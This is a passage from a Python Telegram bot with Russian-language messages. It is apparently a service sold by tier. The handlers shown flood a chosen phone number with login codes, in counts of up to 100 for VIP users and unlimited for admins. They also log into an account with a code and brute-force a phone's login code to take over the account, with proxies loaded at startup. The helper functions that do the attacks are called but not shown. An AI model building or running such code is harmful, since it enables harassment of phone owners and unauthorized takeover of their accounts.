        if not phone.startswith('+'):
            phone = '+' + phone
        
        if not re.match(r'^\+\d{10,15}$', phone):
            await message.answer("❌ Неверный формат номера")
            del user_states[user_id]
            return
        
        if is_phone_blacklisted(phone):
            await message.answer("❌ Номер в ЧС")
            del user_states[user_id]
            return
        
        try:
            count = int(parts[1])
            if is_admin(user_id):
                max_count = 999999
            elif rank == 'vip':
                max_count = 100
            elif rank in ['unlock', 'antibot']:
                max_count = 20
            else:
                max_count = 0
            if count < 1 or count > max_count:
                await message.answer(f"❌ От 1 до {max_count}")
                return
        except ValueError:
            await message.answer("❌ Введи число")
            return
        
        status_msg = await message.answer(f"⏳ Отправка {count} кодов на {phone}...")
        results, sent, failed = await spam_codes(phone, count)
        await status_msg.edit_text(
            f"📨 РЕЗУЛЬТАТ\n\nНомер: {phone}\nВсего: {count}\n✅ Успешно: {sent}\n❌ Ошибок: {failed}",
            reply_markup=await main_keyboard(user_id)
        )
        await log_action(user_id, "spam", f"{phone} | {count}")
        del user_states[user_id]
        return
    
    # ===== ВХОД ПО КОДУ =====
    if action == "waiting_login":
        parts = text.split()
        if len(parts) != 2:
            await message.answer("❌ Формат: +79031234567 12345")
            return
        
        phone = parts[0]
        if not phone.startswith('+'):
            phone = '+' + phone
        
        code = parts[1]
        if not code.isdigit() or len(code) != 5:
            await message.answer("❌ Код должен быть 5 цифр")
            del user_states[user_id]
            return
        
        await message.answer(f"⏳ Вход...")
        result = await login_with_retry(phone, code)
        if result["success"]:
            await message.answer(f"✅ ВОШЁЛ\n\n👤 {result['first_name']}\n🔹 @{result['username']}", reply_markup=await main_keyboard(user_id))
            await log_action(user_id, "login_success", phone)
        else:
            await message.answer(f"❌ {result['error']}", reply_markup=await main_keyboard(user_id))
        del user_states[user_id]
        return
    
    # ===== БРУТФОРС =====
    if action == "waiting_bruteforce":
        if rank not in ['vip', 'admin']:
            await message.answer("💎 Только для VIP")
            del user_states[user_id]
            return
        
        phone = text.strip()
        if not phone.startswith('+'):
            phone = '+' + phone
        
        if not re.match(r'^\+\d{10,15}$', phone):
            await message.answer("❌ Неверный формат номера")
            del user_states[user_id]
            return
        
        if is_phone_blacklisted(phone):
            await message.answer("❌ Номер в ЧС")
            del user_states[user_id]
            return
        
        status_msg = await message.answer(f"⚡ Брутфорс {phone}...")
        result = await fast_bruteforce_reverse(phone)
        if result["success"]:
            login_result = await login_with_code(phone, result["code"])
            if login_result["success"]:
                await status_msg.edit_text(f"✅ КОД: {result['code']}\n✅ ВОШЁЛ: @{login_result['username']}", reply_markup=await main_keyboard(user_id))
            else:
                await status_msg.edit_text(f"✅ КОД: {result['code']}\n❌ Ошибка входа", reply_markup=await main_keyboard(user_id))
        else:
            await status_msg.edit_text(f"❌ Код не найден", reply_markup=await main_keyboard(user_id))
        del user_states[user_id]
        return

# ===== ЗАПУСК =====
async def main():
    print("🤖 БОТ ЗАПУЩЕН")
    await init_db()
    load_proxies()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())